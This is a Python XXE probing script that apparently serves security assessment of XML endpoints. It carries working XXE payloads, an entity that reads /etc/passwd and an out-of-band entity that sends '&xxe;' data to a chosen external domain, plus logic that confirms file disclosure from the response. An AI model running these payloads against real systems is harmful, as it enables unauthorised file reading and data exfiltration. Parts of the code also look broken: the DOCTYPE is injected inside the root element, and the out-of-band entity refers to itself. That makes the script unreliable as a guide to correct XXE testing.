#!/usr/bin/env python3
"""Probe XML endpoints for XXE via error-based and OOB entity payloads."""

import argparse
import re
import urllib.error
import urllib.request

UA = "security-assessment-scripts/1.0"

PASSWD_PATTERN = re.compile(r"root:[x*!]:0:0:")

PARSER_ERRORS = [
  ("libxml/lxml", r"lxml\.etree\.XMLSyntax|xmlSAX2|EntityError"),
  ("PHP SimpleXML", r"simplexml_load_string|SimpleXMLElement"),
  ("Java Xerces", r"javax\.xml\.parse|SAXParseException|org\.xml\.sax"),
  (".NET XmlDocument", r"XmlException|System\.Xml"),
  ("Entity refused (safe)", r"undefined entity|undeclared entity|entity.*not (?:allowed|defined)|DOCTYPE.*disallow"),
]


def post_xml(url, xml_body, timeout=10):
  request = urllib.request.Request(
    url,
    data=xml_body.encode(),
    headers={"User-Agent": UA, "Content-Type": "application/xml"},
  )
  try:
    response = urllib.request.urlopen(request, timeout=timeout)
    return getattr(response, "status", response.code), response.read(131072).decode("utf-8", "replace")
  except urllib.error.HTTPError as exc:
    return exc.code, exc.read(131072).decode("utf-8", "replace")
  except (urllib.error.URLError, OSError):
    return None, ""


def build_payloads(sample_xml, oob_domain):
  doctype_internal = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
  payloads = [
    ("internal entity -> /etc/passwd",
     inject_doctype(sample_xml, doctype_internal, use_entity=True)),
  ]
  if oob_domain:
    doctype_oob = f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob_domain}/?leak=&xxe;">]>'
    payloads.append(("out-of-band callback", inject_doctype(sample_xml, doctype_oob, use_entity=False)))
  return payloads


def inject_doctype(sample_xml, doctype, use_entity):
  index = sample_xml.find(">")
  head = sample_xml[:index + 1]
  rest = sample_xml[index + 1:]
  if not use_entity:
    rest = rest.replace("&xxe;", "")
  return head + " " + doctype + rest


def main():
  parser = argparse.ArgumentParser(description="Send classic XXE payloads to an authorized XML endpoint.")
  parser.add_argument("url", help="endpoint that accepts an XML body")
  parser.add_argument("--sample-xml", default="<root><data>test</data></root>",
                      help="baseline XML the endpoint expects; &xxe; marks where output should land")
  parser.add_argument("--oob-domain", default=None,
                      help="domain you control for out-of-band callbacks; script tells you what to watch for")
  parser.add_argument("--timeout", type=float, default=10.0)
  args = parser.parse_args()

  if "&xxe;" in args.sample_xml:
    baseline = args.sample_xml.replace("&xxe;", "")
  else:
    baseline = args.sample_xml

  status, body = post_xml(args.url, baseline, args.timeout)
  print(f"[*] baseline XML: HTTP {status}, {len(body)} bytes\n")

  vulnerable = False
  for label, payload in build_payloads(args.sample_xml, args.oob_domain):
    status, body = post_xml(args.url, payload, args.timeout)
    print(f"[*] {label}: HTTP {status}")

    if PASSWD_PATTERN.search(body):
      print("[!] XXE CONFIRMED: passwd contents present in response")
      match = PASSWD_PATTERN.search(body)
      print(f"      evidence: {body[max(0,match.start()-40):match.end()+60][:140]}")
      vulnerable = True

    matched_safe = False
    for engine, pattern in PARSER_ERRORS:
      if re.search(pattern, body, re.IGNORECASE):
        snippet = body[:200].replace("\n", " ")
        print(f"      parser signature: {engine} -> ...{snippet}...")
        if "refused" in engine or "disallow" in pattern:
          matched_safe = True
        break

    if label.startswith("out-of-band"):
      print(f"      check DNS/HTTP logs on {args.oob_domain} for a callback to confirm blind XXE")

  print()
  if not vulnerable:
    if matched_safe:
      print("[+] Parser rejected external entities (common hardened default) - try parameter entities or local DTD tricks manually.")
    else:
      print("[+] No direct XXE confirmation from these probes.")


if __name__ == "__main__":
  main()
